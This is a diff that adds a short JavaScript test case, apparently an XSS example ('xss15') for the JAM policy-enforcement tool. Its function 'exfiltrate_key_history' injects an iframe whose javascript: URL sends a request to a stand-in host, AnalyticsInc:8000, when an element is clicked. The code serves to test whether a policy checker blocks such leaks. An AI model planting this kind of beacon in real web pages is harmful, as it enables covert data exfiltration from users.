@@ -1,0 +1,16 @@
+
+JAM.startProfile('load');
+function exfiltrate_key_history() {
+  var script = document.createElement("iframe");
+  script.src = 'javascript:Function(\'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET","http://AnalyticsInc:8000/submission.html?test=xss15",true);xmlhttp.send(null);\')()';
+  var v2 = document.getElementsByTagName("body");
+  introspect(JAM.policy.p1) {
+    var v0 = v2[0]
+  }
+  v0.appendChild(script);
+  return;
+}
+var v1 = document.getElementById("test");
+v1.onclick = exfiltrate_key_history
+
+JAM.stopProfile('load');
